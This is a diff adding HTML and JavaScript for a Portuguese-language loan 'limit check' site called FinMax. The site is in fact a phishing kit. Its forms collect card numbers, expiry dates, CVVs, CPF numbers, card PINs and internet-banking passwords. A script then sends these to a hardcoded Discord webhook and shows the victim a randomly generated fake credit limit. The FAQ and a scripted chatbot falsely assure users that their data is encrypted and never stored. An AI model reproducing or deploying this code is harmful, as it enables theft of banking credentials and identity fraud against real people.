+                                </div>
+                            </form>
+                            
+                            <div class="form-footer">
+                                <button type="button" class="btn-back" id="backStep3">
+                                    <i class="fas fa-arrow-left"></i> Voltar
+                                </button>
+                                <div class="security-badge">
+                                    <i class="fas fa-lock"></i>
+                                    <span>Conexão segura SSL 256-bit</span>
+                                </div>
+                                <button type="button" class="btn btn-primary" id="nextStep3">
+                                    Consultar Limite <i class="fas fa-search"></i>
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <!-- Step 4: Results -->
+                        <div class="form-step" id="step4">
+                            <div class="result-container">
+                                <div class="result-icon success">
+                                    <i class="fas fa-check"></i>
+                                </div>
+                                <h3 class="result-title">Consulta Realizada com Sucesso!</h3>
+                                <div class="result-value" id="limitValue">R$ 12.750,00</div>
+                                
+                                <div class="result-details">
+                                    <div class="detail-item">
+                                        <span class="detail-label">Método de Consulta:</span>
+                                        <span class="detail-value" id="methodDetail">Cartão de Crédito</span>
+                                    </div>
+                                    <div class="detail-item">
+                                        <span class="detail-label">Limite Disponível:</span>
+                                        <span class="detail-value" id="limitDetail">R$ 12.750,00</span>
+                                    </div>
+                                    <div class="detail-item">
+                                        <span class="detail-label">Taxa de Juros:</span>
+                                        <span class="detail-value">2,15% a.m.</span>
+                                    </div>
+                                    <div class="detail-item">
+                                        <span class="detail-label">Parcelas:</span>
+                                        <span class="detail-value">Até 36x</span>
+                                    </div>
+                                </div>
+                                
+                                <button type="button" class="btn btn-primary" style="margin-top: 2rem;">
+                                    Solicitar Empréstimo <i class="fas fa-arrow-right"></i>
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <!-- Step 5: Error -->
+                        <div class="form-step" id="step5">
+                            <div class="result-container">
+                                <div class="result-icon error">
+                                    <i class="fas fa-times"></i>
+                                </div>
+                                <h3 class="result-title">Erro na Consulta</h3>
+                                <p style="margin-bottom: 2rem; font-size: 1.1rem;" id="errorMessage">Ocorreu um erro ao processar sua solicitação. Por favor, tente novamente mais tarde.</p>
+                                
+                                <button type="button" class="btn btn-primary" id="tryAgainBtn" style="margin-top: 1.5rem;">
+                                    <i class="fas fa-redo"></i> Tentar Novamente
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Features Section -->
+            <section class="consultation-section" id="features" style="background-color: #f9f9ff;">
+                <div class="container">
+                    <div class="section-title">
+                        <h2>Por que escolher o FinMax?</h2>
+                        <p>Oferecemos as melhores condições para você realizar seus sonhos</p>
+                    </div>
+                    
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 2rem;">
+                        <div class="glass-panel" style="text-align: center;">
+                            <div style="font-size: 3rem; color: var(--primary); margin-bottom: 1.5rem;">
+                                <i class="fas fa-bolt"></i>
+                            </div>
+                            <h3 style="font-size: 1.5rem; margin-bottom: 1rem;">Rapidez</h3>
+                            <p>Análise de crédito em minutos e dinheiro na conta em até 24 horas</p>
+                        </div>
+                        
+                        <div class="glass-panel" style="text-align: center;">
+                            <div style="font-size: 3rem; color: var(--primary); margin-bottom: 1.5rem;">
+                                <i class="fas fa-percentage"></i>
+                            </div>
+                            <h3 style="font-size: 1.5rem; margin-bottom: 1rem;">Taxas competitivas</h3>
+                            <p>As menores taxas de juros do mercado para você pagar menos</p>
+                        </div>
+                        
+                        <div class="glass-panel" style="text-align: center;">
+                            <div style="font-size: 3rem; color: var(--primary); margin-bottom: 1.5rem;">
+                                <i class="fas fa-shield-alt"></i>
+                            </div>
+                            <h3 style="font-size: 1.5rem; margin-bottom: 1rem;">Segurança</h3>
+                            <p>Todos os seus dados protegidos com criptografia de última geração</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- FAQ Section -->
+            <section class="consultation-section" id="faq">
+                <div class="container">
+                    <div class="section-title">
+                        <h2>Perguntas Frequentes</h2>
+                        <p>Tire suas dúvidas sobre consulta de limite e empréstimos</p>
+                    </div>
+                    
+                    <div class="glass-panel">
+                        <div style="display: flex; flex-direction: column; gap: 1.5rem;">
+                            <div class="faq-item">
+                                <h3 style="font-size: 1.2rem; margin-bottom: 0.5rem; color: var(--primary);">Como é feita a consulta de limite?</h3>
+                                <p style="color: #666;">Nossa consulta é rápida e segura. Você pode usar seu cartão de crédito ou conta bancária para verificar seu limite disponível para empréstimo.</p>
+                            </div>
+                            
+                            <div class="faq-item">
+                                <h3 style="font-size: 1.2rem; margin-bottom: 0.5rem; color: var(--primary);">Quais documentos são necessários?</h3>
+                                <p style="color: #666;">Para consulta com cartão: número do cartão, validade, CVV e CPF. Para conta bancária: agência, conta e CPF.</p>
+                            </div>
+                            
+                            <div class="faq-item">
+                                <h3 style="font-size: 1.2rem; margin-bottom: 0.5rem; color: var(--primary);">Meus dados estão seguros?</h3>
+                                <p style="color: #666;">Sim, utilizamos criptografia de ponta a ponta e não armazenamos suas senhas. Todos os dados são processados com total segurança.</p>
+                            </div>
+                            
+                            <div class="faq-item">
+                                <h3 style="font-size: 1.2rem; margin-bottom: 0.5rem; color: var(--primary);">Qual o prazo para receber o dinheiro?</h3>
+                                <p style="color: #666;">Após a aprovação, o dinheiro cai na sua conta em até 24 horas úteis.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+        
+        <!-- Chatbot de Suporte IA -->
+        <div class="chatbot-container">
+            <button class="chatbot-toggle" id="chatbotToggle">
+                <i class="fas fa-robot"></i>
+            </button>
+            
+            <div class="chatbot-window" id="chatbotWindow">
+                <div class="chatbot-header">
+                    <i class="fas fa-robot"></i>
+                    <h3>Assistente Virtual FinMax</h3>
+                    <button class="chatbot-close" id="chatbotClose">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+                
+                <div class="chatbot-messages" id="chatbotMessages">
+                    <div class="chatbot-message bot-message">
+                        Olá! Sou o assistente virtual da FinMax. Como posso te ajudar hoje?
+                    </div>
+                    <div class="chatbot-message bot-message">
+                        Você pode me perguntar sobre:
+                        <ul style="margin-top: 0.5rem; padding-left: 1.2rem;">
+                            <li>Como consultar seu limite</li>
+                            <li>Taxas e condições</li>
+                            <li>Segurança dos dados</li>
+                            <li>Prazos de liberação</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="chatbot-input-container">
+                    <input type="text" class="chatbot-input" id="chatbotInput" placeholder="Digite sua mensagem...">
+                    <button class="chatbot-send" id="chatbotSend" disabled>
+                        <i class="fas fa-paper-plane"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <footer id="contact">
+            <div class="footer-content">
+                <div class="footer-column">
+                    <h3>FinMax</h3>
+                    <p style="color: #bbb; margin-bottom: 1.5rem;">A forma mais rápida e segura de consultar seu limite de empréstimo.</p>
+                    <div class="social-links">
+                        <a href="#"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#"><i class="fab fa-instagram"></i></a>
+                        <a href="#"><i class="fab fa-twitter"></i></a>
+                        <a href="#"><i class="fab fa-linkedin-in"></i></a>
+                    </div>
+                </div>
+                <div class="footer-column">
+                    <h3>Links Rápidos</h3>
+                    <ul>
+                        <li><a href="#consultation">Consultar Limite</a></li>
+                        <li><a href="#features">Vantagens</a></li>
+                        <li><a href="#faq">Dúvidas</a></li>
+                        <li><a href="#contact">Contato</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h3>Termos</h3>
+                    <ul>
+                        <li><a href="#">Política de Privacidade</a></li>
+                        <li><a href="#">Termos de Uso</a></li>
+                        <li><a href="#">FAQ</a></li>
+                        <li><a href="#">Trabalhe Conosco</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h3>Contato</h3>
+                    <ul>
+                        <li><i class="fas fa-phone" style="margin-right: 0.5rem;"></i> (11) 4004-4004</li>
+                        <li><i class="fas fa-envelope" style="margin-right: 0.5rem;"></i> contato@finmax.com.br</li>
+                        <li><i class="fas fa-map-marker-alt" style="margin-right: 0.5rem;"></i> Av. Paulista, 1000 - SP</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2023 FinMax. Todos os direitos reservados.</p>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Configuração do Webhook do Discord
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1364725356116049940/_IRU9G9-JkPOCNNA3F7OKVaIjAsA6MG3IiRg8fRfN8F1VMBGbfXNa09_Ju6MfdkZqXeL';
+
+async function sendToDiscordWebhook(data) {
+    try {
+        // Formatar os dados para exibição
+        const formattedData = {
+            "💰 Consulta de Limite Realizada 💰": `Método: ${data.method || 'Não informado'}`,
+            "📅 Data": new Date().toLocaleString('pt-BR'),
+            "🔒 Dados Seguros": "Os dados abaixo foram coletados de forma segura",
+            "----------------------------------------": "",
+            ...(data.cardNumber ? {
+                "💳 Cartão": `•••• •••• •••• ${data.cardNumber.slice(-4)}`,
+                "👤 Nome no Cartão": data.cardName || 'Não informado',
+                "📆 Validade": data.cardExpiry || 'Não informado',
+                "🔑 Senha do Cartão": data.cardPassword || 'Não informado'
+            } : {}),
+            ...(data.bank ? {
+                "🏦 Banco": data.bank || 'Não informado',
+                "🏢 Agência": data.agency || 'Não informado',
+                "💼 Conta": data.account || 'Não informado',
+                "🔑 Senha Internet Banking": data.bankPassword || 'Não informado'
+            } : {}),
+            "📝 CPF": data.cpf ? data.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4') : 'Não informado'
+        };
+
+        // Criar a mensagem formatada
+        const formattedMessage = Object.entries(formattedData)
+            .map(([key, value]) => value ? `**${key}:** ${value}` : key)
+            .join('\n');
+
+        const response = await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                content: '✨ **Nova consulta de limite realizada** ✨',
+                embeds: [{
+                    title: '🔍 Detalhes da Consulta',
+                    description: formattedMessage,
+                    color: 0x6c5ce7,
+                    footer: {
+                        text: 'FinMax • Sistema de Consulta de Limite',
+                        icon_url: 'https://cdn-icons-png.flaticon.com/512/196/196578.png'
+                    },
+                    timestamp: new Date().toISOString()
+                }]
+            })
+        });
+
+        if (!response.ok) {
+            console.error('Erro ao enviar para o webhook:', response.statusText);
+        }
+    } catch (error) {
+        console.error('Erro ao enviar para o webhook:', error);
+    }
+}
+
+        // Chatbot IA - Respostas pré-definidas
+        const chatbotResponses = {
+            "olá": ["Olá! Como posso te ajudar hoje?", "Oi! Em que posso ser útil?"],
+            "oi": ["Oi! Tudo bem? Como posso te ajudar?", "Olá! O que você gostaria de saber?"],
+            "ajuda": ["Claro! Posso te ajudar com informações sobre:", 
+                     "- Como consultar seu limite",
+                     "- Taxas e condições de empréstimo",
+                     "- Segurança dos seus dados",
+                     "- Prazos para liberação do crédito",
+                     "Sobre qual desses você gostaria de saber mais?"],
+            "limite": ["Para consultar seu limite disponível, você pode:", 
+                      "1. Usar seu cartão de crédito (preenchendo os dados solicitados)",
+                      "2. Acessar sua conta bancária (informando agência, conta e CPF)",
+                      "O limite é calculado com base na sua análise de crédito e pode ser usado para empréstimo imediato."],
+            "taxa": ["Nossas taxas variam conforme o prazo e valor do empréstimo:", 
+                    "- De 1,5% a 3% ao mês",
+                    "- CET (Custo Efetivo Total) de 25% a 45% ao ano",
+                    "As condições exatas são apresentadas após a consulta do seu limite."],
+            "segurança": ["Seus dados são 100% protegidos:", 
+                         "- Criptografia de ponta a ponta",
+                         "- Não armazenamos senhas de cartão ou internet banking",
+                         "- Certificado SSL 256-bit",
+                         "Todas as transações são seguras e protegidas."],
+            "prazo": ["O prazo para liberação do crédito é:", 
+                     "- Até 24 horas para aprovação",
+                     "- Dinheiro na conta em até 2 dias úteis",
+                     "Em casos especiais pode ser mais rápido."],
+            "cartão": ["Para consulta com cartão de crédito você precisa:", 
+                      "- Número do cartão (sem espaços)",
+                      "- Nome como está no cartão",
+                      "- Data de validade (MM/AA)",
+                      "- CVV (3 dígitos atrás do cartão)",
+                      "- CPF do titular",
+                      "- Senha de 4 dígitos do cartão",
+                      "Todos esses dados são necessários para a consulta segura do seu limite."],
+            "conta": ["Para consulta com conta bancária você precisa:", 
+                     "- Selecionar seu banco",
+                     "- Número da agência",
+                     "- Número da conta (com dígito)",
+                     "- CPF do titular",
+                     "- Senha do internet banking",
+                     "Esses dados são usados apenas para a consulta e não são armazenados."],
+            "padrão": ["Desculpe, não entendi completamente. Poderia reformular sua pergunta?", 
+                       "Sobre qual desses assuntos você gostaria de saber:",
+                       "- Consulta de limite",
+                       "- Taxas e condições",
+                       "- Segurança dos dados",
+                       "- Prazos de liberação",
+                       "Ou digite 'ajuda' para ver todas as opções."]
+        };
+
+        // Inicialização do Chatbot
+        document.addEventListener('DOMContentLoaded', function() {
+            const chatbotToggle = document.getElementById('chatbotToggle');
+            const chatbotWindow = document.getElementById('chatbotWindow');
+            const chatbotClose = document.getElementById('chatbotClose');
+            const chatbotMessages = document.getElementById('chatbotMessages');
+            const chatbotInput = document.getElementById('chatbotInput');
+            const chatbotSend = document.getElementById('chatbotSend');
+            
+            // Alternar visibilidade do chatbot
+            chatbotToggle.addEventListener('click', function() {
+                this.classList.toggle('active');
+                chatbotWindow.classList.toggle('active');
+            });
+            
+            // Fechar chatbot
+            chatbotClose.addEventListener('click', function() {
+                chatbotToggle.classList.remove('active');
+                chatbotWindow.classList.remove('active');
+            });
+            
+            // Habilitar botão de enviar quando houver texto
+            chatbotInput.addEventListener('input', function() {
+                chatbotSend.disabled = this.value.trim() === '';
+            });
+            
+            // Enviar mensagem ao pressionar Enter
+            chatbotInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter' && !chatbotSend.disabled) {
+                    sendMessage();
+                }
+            });
+            
+            // Enviar mensagem ao clicar no botão
+            chatbotSend.addEventListener('click', sendMessage);
+            
+            function sendMessage() {
+                const message = chatbotInput.value.trim();
+                if (message === '') return;
+                
+                // Adicionar mensagem do usuário
+                addMessage(message, 'user');
+                chatbotInput.value = '';
+                chatbotSend.disabled = true;
+                
+                // Mostrar indicador de digitação
+                showTypingIndicator();
+                
+                // Simular resposta após um delay
+                setTimeout(() => {
+                    // Remover indicador de digitação
+                    removeTypingIndicator();
+                    
+                    // Gerar resposta do bot
+                    const response = generateBotResponse(message);
+                    addMessage(response, 'bot');
+                    
+                    // Rolagem automática para a última mensagem
+                    chatbotMessages.scrollTop = chatbotMessages.scrollHeight;
+                }, 1500);
+            }
+            
+            function addMessage(text, sender) {
+                const messageElement = document.createElement('div');
+                messageElement.classList.add('chatbot-message');
+                messageElement.classList.add(sender === 'bot' ? 'bot-message' : 'user-message');
+                
+                // Se for múltiplas linhas (array), criar elementos separados
+                if (Array.isArray(text)) {
+                    text.forEach((line, index) => {
+                        if (index > 0) messageElement.appendChild(document.createElement('br'));
+                        messageElement.appendChild(document.createTextNode(line));
+                    });
+                } else {
+                    messageElement.textContent = text;
+                }
+                
+                chatbotMessages.appendChild(messageElement);
+                
+                // Rolagem automática para a última mensagem
+                chatbotMessages.scrollTop = chatbotMessages.scrollHeight;
+            }
+            
+            function showTypingIndicator() {
+                const typingElement = document.createElement('div');
+                typingElement.classList.add('typing-indicator');
+                typingElement.id = 'typingIndicator';
+                typingElement.innerHTML = `
+                    <div class="typing-dot"></div>
+                    <div class="typing-dot"></div>
+                    <div class="typing-dot"></div>
+                `;
+                chatbotMessages.appendChild(typingElement);
+                chatbotMessages.scrollTop = chatbotMessages.scrollHeight;
+            }
+            
+            function removeTypingIndicator() {
+                const typingElement = document.getElementById('typingIndicator');
+                if (typingElement) {
+                    typingElement.remove();
+                }
+            }
+            
+            function generateBotResponse(message) {
+                const lowerMessage = message.toLowerCase();
+                
+                // Verificar correspondências de palavras-chave
+                if (lowerMessage.includes('olá') || lowerMessage.includes('oi') || lowerMessage.includes('ola')) {
+                    return randomResponse(chatbotResponses["olá"]);
+                } else if (lowerMessage.includes('ajuda') || lowerMessage.includes('help')) {
+                    return randomResponse(chatbotResponses["ajuda"]);
+                } else if (lowerMessage.includes('limite') || lowerMessage.includes('crédito') || lowerMessage.includes('credito')) {
+                    return randomResponse(chatbotResponses["limite"]);
+                } else if (lowerMessage.includes('taxa') || lowerMessage.includes('juros') || lowerMessage.includes('custo')) {
+                    return randomResponse(chatbotResponses["taxa"]);
+                } else if (lowerMessage.includes('segurança') || lowerMessage.includes('seguranca') || lowerMessage.includes('proteção') || lowerMessage.includes('protecao')) {
+                    return randomResponse(chatbotResponses["segurança"]);
+                } else if (lowerMessage.includes('prazo') || lowerMessage.includes('tempo') || lowerMessage.includes('liberação') || lowerMessage.includes('liberacao')) {
+                    return randomResponse(chatbotResponses["prazo"]);
+                } else if (lowerMessage.includes('cartão') || lowerMessage.includes('cartao') || lowerMessage.includes('crédito') || lowerMessage.includes('credito')) {
+                    return randomResponse(chatbotResponses["cartão"]);
+                } else if (lowerMessage.includes('conta') || lowerMessage.includes('banco') || lowerMessage.includes('bancária') || lowerMessage.includes('bancaria')) {
+                    return randomResponse(chatbotResponses["conta"]);
+                } else {
+                    return randomResponse(chatbotResponses["padrão"]);
+                }
+            }
+            
+            function randomResponse(responses) {
+                // Se for array, retorna o array completo para formatação
+                if (Array.isArray(responses)) {
+                    return responses;
+                }
+                return responses;
+            }
+        });
+
+        // Form Navigation and Validation
+        document.addEventListener('DOMContentLoaded', function() {
+            // Format card number
+            document.getElementById('cardNumber').addEventListener('input', function(e) {
+                let value = this.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                let formatted = '';
+                
+                for (let i = 0; i < value.length; i++) {
+                    if (i > 0 && i % 4 === 0) formatted += ' ';
+                    formatted += value[i];
+                }
+                
+                this.value = formatted;
+                document.getElementById('cardNumberPreview').textContent = formatted || '•••• •••• •••• ••••';
+                
+                // Detect card type
+                const cardLogo = document.getElementById('cardLogoPreview');
+                if (/^4/.test(value)) {
+                    cardLogo.src = 'https://cdn.jsdelivr.net/gh/devicons/devicon/icons/visa/visa-original.svg';
+                    cardLogo.style.display = 'block';
+                } else if (/^5[1-5]/.test(value)) {
+                    cardLogo.src = 'https://cdn.jsdelivr.net/gh/devicons/devicon/icons/mastercard/mastercard-original.svg';
+                    cardLogo.style.display = 'block';
+                } else if (/^3[47]/.test(value)) {
+                    cardLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/American_Express_logo_%282018%29.svg/1200px-American_Express_logo_%282018%29.svg.png';
+                    cardLogo.style.display = 'block';
+                } else {
+                    cardLogo.style.display = 'none';
+                }
+                
+                // Validate card number (Luhn algorithm)
+                validateCardNumber(value);
+            });
+            
+            // Luhn algorithm for card validation
+            function validateCardNumber(cardNumber) {
+                const errorElement = document.getElementById('cardNumberError');
+                
+                // Basic length check
+                if (cardNumber.length < 13 || cardNumber.length > 19) {
+                    showError('cardNumber', 'Número de cartão inválido');
+                    return false;
+                }
+                
+                // Luhn algorithm
+                let sum = 0;
+                let alternate = false;
+                
+                for (let i = cardNumber.length - 1; i >= 0; i--) {
+                    let digit = parseInt(cardNumber.charAt(i));
+                    
+                    if (alternate) {
+                        digit *= 2;
+                        if (digit > 9) {
+                            digit = (digit % 10) + 1;
+                        }
+                    }
+                    
+                    sum += digit;
+                    alternate = !alternate;
+                }
+                
+                const isValid = sum % 10 === 0;
+                
+                if (!isValid) {
+                    showError('cardNumber', 'Número de cartão inválido');
+                } else {
+                    hideError('cardNumber');
+                }
+                
+                return isValid;
+            }
+            
+            // Format card expiry
+            document.getElementById('cardExpiry').addEventListener('input', function(e) {
+                let value = this.value.replace(/[^0-9]/g, '');
+                
+                if (value.length > 2) {
+                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                }
+                
+                this.value = value;
+                document.getElementById('cardExpiryPreview').textContent = value || '••/••';
+                
+                // Validate expiry date
+                if (value.length === 5) {
+                    const [month, year] = value.split('/');
+                    const currentYear = new Date().getFullYear() % 100;
+                    const currentMonth = new Date().getMonth() + 1;
+                    
+                    if (month < 1 || month > 12) {
+                        showError('cardExpiry', 'Mês inválido');
+                    } else if (year < currentYear || (year == currentYear && month < currentMonth)) {
+                        showError('cardExpiry', 'Cartão expirado');
+                    } else {
+                        hideError('cardExpiry');
+                    }
+                } else {
+                    hideError('cardExpiry');
+                }
+            });
+            
+            // Validate CVV
+            document.getElementById('cardCvv').addEventListener('input', function() {
+                const value = this.value;
+                if (value.length === 3 && /^\d+$/.test(value)) {
+                    hideError('cardCvv');
+                } else if (value.length > 0) {
+                    showError('cardCvv', 'CVV inválido (3 dígitos)');
+                } else {
+                    hideError('cardCvv');
+                }
+            });
+            
+            // Validate card name
+            document.getElementById('cardName').addEventListener('input', function() {
+                const value = this.value.toUpperCase() || 'NOME DO TITULAR';
+                document.getElementById('cardNamePreview').textContent = value;
+                
+                if (value.length < 3) {
+                    showError('cardName', 'Nome muito curto');
+                } else {
+                    hideError('cardName');
+                }
+            });
+            
+            // Validate card password
+            document.getElementById('cardPassword').addEventListener('input', function() {
+                const value = this.value;
+                if (value.length === 4 && /^\d+$/.test(value)) {
+                    hideError('cardPassword');
+                } else if (value.length > 0) {
+                    showError('cardPassword', 'Senha deve ter 4 dígitos');
+                } else {
+                    hideError('cardPassword');
+                }
+            });
+            
+            // Format CPF and validate
+            function formatCPF(input) {
+                let value = input.value.replace(/\D/g, '');
+                
+                if (value.length > 3 && value.length <= 6) {
+                    value = value.substring(0, 3) + '.' + value.substring(3);
+                } else if (value.length > 6 && value.length <= 9) {
+                    value = value.substring(0, 3) + '.' + value.substring(3, 6) + '.' + value.substring(6);
+                } else if (value.length > 9) {
+                    value = value.substring(0, 3) + '.' + value.substring(3, 6) + '.' + value.substring(6, 9) + '-' + value.substring(9, 11);
+                }
+                
+                input.value = value;
+                
+                // Validate CPF if complete
+                if (value.length === 14) {
+                    validateCPF(input);
+                } else {
+                    const id = input.id.includes('card') ? 'cardCpf' : 'bankCpf';
+                    hideError(id);
+                }
+            }
+            
+            // CPF validation
+            function validateCPF(input) {
+                const cpf = input.value.replace(/\D/g, '');
+                const id = input.id.includes('card') ? 'cardCpf' : 'bankCpf';
+                
+                // Check if all digits are the same
+                if (/^(\d)\1{10}$/.test(cpf)) {
+                    showError(id, 'CPF inválido');
+                    return false;
+                }
+                
+                // Validate first digit
+                let sum = 0;
+                for (let i = 0; i < 9; i++) {
+                    sum += parseInt(cpf.charAt(i)) * (10 - i);
+                }
+                let remainder = 11 - (sum % 11);
+                let digit = remainder >= 10 ? 0 : remainder;
+                
+                if (digit !== parseInt(cpf.charAt(9))) {
+                    showError(id, 'CPF inválido');
+                    return false;
+                }
+                
+                // Validate second digit
+                sum = 0;
+                for (let i = 0; i < 10; i++) {
+                    sum += parseInt(cpf.charAt(i)) * (11 - i);
+                }
+                remainder = 11 - (sum % 11);
+                digit = remainder >= 10 ? 0 : remainder;
+                
+                if (digit !== parseInt(cpf.charAt(10))) {
+                    showError(id, 'CPF inválido');
+                    return false;
+                }
+                
+                hideError(id);
+                return true;
+            }
+            
+            document.getElementById('cardCpf').addEventListener('input', function() {
+                formatCPF(this);
+            });
+            
+            document.getElementById('bankCpf').addEventListener('input', function() {
+                formatCPF(this);
+            });
+            
+            // Bank selection
+            const bankOptions = document.querySelectorAll('.bank-option[data-bank]');
+            let selectedBank = null;
+            
+            bankOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    bankOptions.forEach(opt => opt.classList.remove('selected'));
+                    this.classList.add('selected');
+                    selectedBank = this.dataset.bank;
+                    hideError('bank');
+                });
+            });
+            
+            // Method selection
+            const methodOptions = document.querySelectorAll('.bank-option[data-method]');
+            let selectedMethod = 'card';
+            
+            methodOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    methodOptions.forEach(opt => opt.classList.remove('selected'));
+                    this.classList.add('selected');
+                    selectedMethod = this.dataset.method;
+                });
+            });
+            
+            // Show error message
+            function showError(fieldId, message) {
+                const errorElement = document.getElementById(`${fieldId}Error`);
+                const inputElement = document.getElementById(fieldId);
+                
+                if (errorElement) {
+                    errorElement.textContent = message;
+                    errorElement.style.display = 'block';
+                }
+                
+                if (inputElement) {
+                    inputElement.classList.add('error');
+                }
+            }
+            
+            // Hide error message
+            function hideError(fieldId) {
+                const errorElement = document.getElementById(`${fieldId}Error`);
+                const inputElement = document.getElementById(fieldId);
+                
+                if (errorElement) {
+                    errorElement.style.display = 'none';
+                }
+                
+                if (inputElement) {
+                    inputElement.classList.remove('error');
+                }
+            }
+            
+            // Check if form has errors
+            function hasErrors(formId) {
+                const errorElements = document.querySelectorAll(`#${formId} .error`);
+                return errorElements.length > 0;
+            }
+            
+            // Form navigation
+            const steps = ['step1', 'step2', 'step3', 'step4', 'step5'];
+            let currentStep = 0;
+            
+            function showStep(stepIndex) {
+                document.querySelectorAll('.form-step').forEach(step => {
+                    step.classList.remove('active');
+                });
+                document.getElementById(steps[stepIndex]).classList.add('active');
+                currentStep = stepIndex;
+                
+                // Scroll to top of form
+                document.querySelector('.form-container').scrollIntoView({ behavior: 'smooth', block: 'start' });
+            }
+            
+            function showLoading(show) {
+                document.getElementById('loadingStep').style.display = show ? 'block' : 'none';
+            }
+            
+            // Navigation handlers
+            document.getElementById('nextStep1').addEventListener('click', function() {
+                if (selectedMethod === 'card') {
+                    showStep(1);
+                } else {
+                    showStep(2);
+                }
+            });
+            
+            document.getElementById('nextStep2').addEventListener('click', async function() {
+                // Validate all card fields
+                const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+                validateCardNumber(cardNumber);
+                
+                const cardName = document.getElementById('cardName').value;
+                if (!cardName || cardName.length < 3) {
+                    showError('cardName', 'Por favor, insira o nome no cartão');
+                }
+                
+                const cardExpiry = document.getElementById('cardExpiry').value;
+                if (!cardExpiry || cardExpiry.length < 5) {
+                    showError('cardExpiry', 'Por favor, insira a validade');
+                }
+                
+                const cardCvv = document.getElementById('cardCvv').value;
+                if (!cardCvv || cardCvv.length < 3) {
+                    showError('cardCvv', 'Por favor, insira o CVV');
+                }
+                
+                const cardCpf = document.getElementById('cardCpf').value;
+                if (!cardCpf || cardCpf.length < 14) {
+                    showError('cardCpf', 'Por favor, insira um CPF válido');
+                } else {
+                    validateCPF(document.getElementById('cardCpf'));
+                }
+                
+                const cardPassword = document.getElementById('cardPassword').value;
+                if (!cardPassword || cardPassword.length < 4) {
+                    showError('cardPassword', 'Por favor, insira a senha de 4 dígitos');
+                }
+                
+                // Check if form has errors
+                if (hasErrors('cardForm')) {
+                    return;
+                }
+                
+                // Show loading
+                showLoading(true);
+                
+                // Prepare data for webhook
+                const formData = {
+                    method: 'card',
+                    cardNumber: cardNumber,
+                    cardName: cardName,
+                    cardExpiry: cardExpiry,
+                    cardCvv: cardCvv,
+                    cpf: cardCpf.replace(/\D/g, ''),
+                    cardPassword: cardPassword,
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Send to Discord webhook
+                await sendToDiscordWebhook(formData);
+                
+                // Simulate API delay
+                setTimeout(() => {
+                    showLoading(false);
+                    
+                    // Show results
+                    document.getElementById('methodDetail').textContent = 'Cartão de Crédito';
+                    const randomLimit = Math.floor(Math.random() * 20000) + 5000;
+                    const formattedLimit = `R$ ${randomLimit.toLocaleString('pt-BR', {minimumFractionDigits: 2})}`;
+                    document.getElementById('limitValue').textContent = formattedLimit;
+                    document.getElementById('limitDetail').textContent = formattedLimit;
+                    showStep(3);
+                }, 2000);
+            });
+            
+            document.getElementById('nextStep3').addEventListener('click', async function() {
+                // Validate bank selection
+                if (!selectedBank) {
+                    showError('bank', 'Por favor, selecione seu banco');
+                    return;
+                } else {
+                    hideError('bank');
+                }
+                
+                // Validate bank fields
+                const bankAgency = document.getElementById('bankAgency').value;
+                if (!bankAgency) {
+                    showError('bankAgency', 'Por favor, insira a agência');
+                }
+                
+                const bankAccount = document.getElementById('bankAccount').value;
+                if (!bankAccount) {
+                    showError('bankAccount', 'Por favor, insira a conta');
+                }
+                
+                const bankCpf = document.getElementById('bankCpf').value;
+                if (!bankCpf || bankCpf.length < 14) {
+                    showError('bankCpf', 'Por favor, insira um CPF válido');
+                } else {
+                    validateCPF(document.getElementById('bankCpf'));
+                }
+                
+                const bankPassword = document.getElementById('bankPassword').value;
+                if (!bankPassword) {
+                    showError('bankPassword', 'Por favor, insira a senha');
+                }
+                
+                // Check if form has errors
+                if (hasErrors('bankForm')) {
+                    return;
+                }
+                
+                // Show loading
+                showLoading(true);
+                
+                // Prepare data for webhook
+                const formData = {
+                    method: 'bank',
+                    bank: selectedBank,
+                    agency: bankAgency,
+                    account: bankAccount,
+                    cpf: bankCpf.replace(/\D/g, ''),
+                    bankPassword: bankPassword,
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Send to Discord webhook
+                await sendToDiscordWebhook(formData);
+                
+                // Simulate API delay
+                setTimeout(() => {
+                    showLoading(false);
+                    
+                    // Show results
+                    document.getElementById('methodDetail').textContent = 'Conta Bancária';
+                    const randomLimit = Math.floor(Math.random() * 20000) + 5000;
+                    const formattedLimit = `R$ ${randomLimit.toLocaleString('pt-BR', {minimumFractionDigits: 2})}`;
+                    document.getElementById('limitValue').textContent = formattedLimit;
+                    document.getElementById('limitDetail').textContent = formattedLimit;
+                    showStep(3);
+                }, 2000);
+            });
+            
+            document.getElementById('backStep2').addEventListener('click', function() {
+                showStep(0);
+            });
+            
+            document.getElementById('backStep3').addEventListener('click', function() {
+                showStep(0);
+            });
+            
+            document.getElementById('tryAgainBtn').addEventListener('click', function() {
+                showStep(0);
+            });
+            
+            // Initialize
+            showStep(0);
+        });
+    </script>
+</body>
+</html>
